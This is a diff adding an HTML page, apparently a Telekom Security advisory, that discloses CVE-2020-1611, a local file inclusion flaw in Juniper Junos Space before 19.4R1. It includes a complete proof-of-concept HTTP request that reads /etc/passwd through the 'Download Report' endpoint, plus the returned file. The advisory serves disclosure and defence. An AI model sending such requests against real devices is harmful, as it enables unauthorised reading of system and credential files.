@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<!-- Meta -->
+	<meta charset="UTF-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	<meta name="generator" content="Jekyll">
+
+	<title>Juniper Junos Space Local File Inclusion Vulnerability</title>
+  <meta name="description" content="Juniper Junos Space prior to 19.4R1 Local File Inclusion Vulnerability">
+
+	<!-- CSS & fonts -->
+	<link rel="stylesheet" href="/css/main.css">
+
+	<!-- RSS -->
+	<link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" />
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" type="image/png" href="img/favicon.png">
+
+  <meta http-equiv="refresh" content="0; URL=https://telekom-security.github.io/2020/01/junos-space-local-file-inclusion.html">
+
+</head>
+
+
+<body>
+	<div id="wrap">
+	  	
+	  	<!-- Navigation -->
+      
+    
+    <!-- Icon menu -->
+	  <a id="nav-menu">
+	  	<div id="menu"></div>
+	  </a>
+
+      <!-- Header -->
+      
+        <header id="header" class="parent justify-spaceBetween">
+  <div class="inner w100 relative">
+    <span class="f-left">  
+      <a href="/">
+        <h1>
+          <span>Telekom</span> Security
+        </h1>
+      </a>
+    </span>
+    <span id="nav-links" class="absolute right bottom">
+      <!-- Nav pages -->
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+      
+      <!-- Nav links -->
+	    <a href="/index.html">Home</a>
+<a href="/imprint.html">Imprint</a>
+<a href="/disclaimer.html">Disclaimer</a>
+<a href="/privacy-policy.html">Privacy Policy</a>
+<a href="https://security.telekom.com/">About Telekom Security</a>
+
+
+    </span>
+  </div>
+</header>
+
+
+
+
+      
+
+    <!-- Main content -->
+	  <div id="container">
+		  
+		<main>
+
+			<article id="post-page">
+	<h2>Juniper Junos Space prior to 19.4R1 Local File Inclusion Vulnerability</h2>		
+	<time datetime="2020-01-31T00:00:00+01:00" class="by-line">31 Jan 2020</time>
+	<div class="content">
+
+		<p>A Local File Inclusion vulnerability (CVE-2020-1611) in Juniper Networks Junos Space allows an attacker to view all files on the target when the device receives malicious HTTP packets.</p>
+
+<!--more-->
+
+<h2 id="juniper-junos-space-local-file-inclusion">Juniper Junos Space Local File Inclusion</h2>
+<p>Juniper Junos Space prior to 19.4R1 is vulnerable to a local file inclusion vulnerability. An attacker with normal user rights could exploit this vulnerability.</p>
+
+<p>The “Download Report” function is vulnerable.</p>
+
+<p>Base Score: 6.5<br />
+Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</p>
+
+<p>Links:</p>
+
+<ul>
+  <li>https://nvd.nist.gov/vuln/detail/CVE-2020-1611</li>
+  <li>https://kb.juniper.net/InfoCenter/index?page=content&amp;id=JSA10993</li>
+</ul>
+
+<h3 id="example">Example</h3>
+
+<p>GET Parameters:</p>
+
+<ul>
+  <li>Set “Format” to “txt”</li>
+  <li>Set “FileUrl” to a local path</li>
+</ul>
+
+<p>Request:<br /></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/mainui/download?X-CSRF=Y581SFvKU5INQPItBUoNj4NKf4IuqjSyywfRylPN3GLYaML3fM074gV2AIPBQjHEJsuJ9d7
+&amp;type=downloadGROpenReport&amp;_browserId=1553107455361
+&amp;FileUrl=/etc/passwd&amp;Format=txt&amp;nodeHost=space-000311c3b873</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.10</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US;q=0.7,en;q=0.3</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://10.10.10.10/mainui/nLegacy.jsp?bid=1553107455361&amp;appName=CMP</span>
+<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">ext-$sidebar_gettingStarted_checkbox=o%3Achecked%3Db%253A0;</span>
+<span class="s">DWRSESSIONID=sicWsVGWEjxdNYR7RJ60rCtbBrOmy0JHBm4h;</span>
+<span class="s">JSESSIONID="aoVrgUa7V1prIWVO5KEmCqF6QGuuYZ44RshRxEYHAJXqQDCNBjV6pLKiaaXQx2jWjGWw5TxnDxkKtsi</span>
+<span class="na">_.space-000311c3b873</span><span class="p">:</span><span class="s">server3";</span>
+<span class="s">JSESSIONIDSSO=Cm5qb87syONJ2lku1dadTx-SVyaoy0k9lt-bwSnTkfFrdONVfvmzrxB+g8xny4gjyKk_;</span>
+<span class="s">X-CSRF=Y581SFvKU5INQPItBUoNj4NKf4IuqjSyywfRylPN3GLYaML3fM074gV2AIPBQjHEJsuJ9d7; JxRunningBids=_1553107455361_</span>
+</code></pre></div></div>
+
+<p><br />Response:<br /></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 24 Apr 2019 13:32:31 GMT</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=63072000; includeSubdomains; preload</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">No-cache</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache,no-store,must-revalidate,private</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 01 Jan 1970 00:00:00 UTC</span>
+<span class="na">Content-Disposition</span><span class="p">:</span> <span class="s">attachment; filename="passwd"</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/octet-stream</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1345</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+mysql:x:499:499:MySQL server:/var/lib/mysql:/sbin/nologin
+cassandra:x:498:498::/var/lib/cassandra:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+gluster:x:497:497:GlusterFS daemons:/var/run/gluster:/sbin/nologin
+jboss:x:500:500::/usr/local/jboss:/bin/bash
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+saslauth:x:496:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+unbound:x:495:495:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+redis:x:494:494:Redis Server:/var/lib/redis:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+slipstream:x:493:493::/usr/local//slipstream/:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74::/var/empty/sshd:/sbin/nologin
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+tcpdump:x:72:72::/:/sbin/nologin
+pcap:x:77:77:::/sbin/nologin
+opennms:x:503:504::/home/opennms:/bin/bash
+cassandr:x:504:505::/home/cassandr:/bin/bash
+</code></pre></div></div>
+<p><br />
+<strong>Michael Wollner</strong> (<a href="https://github.com/Ibonok">@Ibonok</a>)</p>
+
+		
+	</div>
+</article>
+
+
+
+	  </main>
+		
+		  <!-- Pagination links -->
+      
+
+	  </div>
+	    
+	    <!-- Footer -->
+	    <footer><span>Based on Monochrome Jekyll theme</span></footer>
+
+
+	    <!-- Script -->
+      <script src="/js/main.js"></script>	
+
+
+	</div>
+</body>
+</html>
